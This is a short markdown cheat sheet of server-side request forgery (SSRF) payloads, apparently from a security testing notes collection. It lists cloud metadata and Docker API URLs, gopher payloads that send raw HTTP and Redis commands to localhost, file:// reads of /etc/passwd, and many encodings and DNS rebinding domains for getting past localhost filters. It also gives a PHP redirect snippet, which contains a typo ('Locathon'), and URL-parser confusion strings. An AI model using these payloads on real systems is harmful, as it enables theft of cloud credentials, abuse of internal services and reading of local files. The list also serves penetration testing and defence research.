# SSRF
> [SSRF bible Cheatsheet](https://cheatsheetseries.owasp.org/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf)

- Scheme
    > [URL schema support](https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit#bookmark=id.osggnj3pn7l6)

    - HTTP
        - Docker API  
            `http://IP:2375/images/json`
        - Cloud Metadata (GCP)  
            `http://metadata.google.internal/computeMetadata/v1/...`
        - Cloud Metadata (AWS)  
            `http://169.254.169.254/latest/user-data/...`
    - Gopher

        > Generate arbitrary TCP packet under no interaction.
        >
        > `gopher://<authority>/<padding><tcp payload>`

        - [Gopher Payload Generator](https://github.com/tarunkant/Gopherus)
        - HTTP GET/POST  
            `gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1%0D%0AHost:127.0.0.1%0D%0A%0D%0A`
        - MySQL (must without password)  
            [tarunkant/Gopherus](https://github.com/tarunkant/Gopherus)
        - Redis  
            `gopher://127.0.0.1:6379/_SET%20key%20"value"%0D%0A`
        - PHP-FPM

    - Local File
        - `file:///etc/passwd`
        - `file://localhost/etc/passwd`
        - `python` `local_file:///etc/passwd`
        - `java` `file:///var/www/html/`
        - `java` `netdoc:///var/www/html/`

- Authority
    - localhost
        - 127.0.0.1
        - localhost
        - 127.0.1
        - 127.1
        - 0.0.0.0
        - 0
    - IP Address
        - 2130706443 (dec)
        - 0x7f00000001 (hex)
        - 0x7f.0x0.0x0.0x1
        - 0177000000001 (oct)
        - 0177.0.0.01
    - IPv6
        - ::1
        - ::127.0.0.1
        - ::ffff:127.0.0.1
        - ::
        - ip6-localhost
    - IDN Encoding
        - http://www.unicode.org/reports/tr46/  
        - [Domain Obfuscator](https://splitline.github.io/domain-obfuscator/)
        - http://ⓀⒶⒾⒷⓇⓄ.ⓉⓌ
    - Domain Name Binding
        - whatever.localtest.me
        - 127.0.0.1.xip.io
    - DNS Rebinding (Round-Robin DNS)
        - foo.bar.10.0.0.1.xip.io
        - A.54.87.54.87.1time.127.0.0.1.forever.rebind.network
        - 36573657.7f000001.rbndr.us
    - 302 Bypass

        > If the environment does not block http redirect, query your own web server which respond
        >
        > ```php
        > <?php
        >   Header("Locathon: gopher://127.0.0.1:9000/_...")
        > ?>
        > ```

    - URL Parser
        - `http://1.1.1.1 &@2.2.2.2# @3.3.3.3/`

            | 1.1.1.1 | 2.2.2.2  | 3.3.3.3 |
            |:-------:|:--------:|:-------:|
            | urllib2 | requests | urllib  |
            | httplib |          |         |

- Case Study
    - [$1.000 SSRF in Slack](https://elbs.medium.com/1-000-ssrf-in-slack-7737935d3884)
    - [A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)
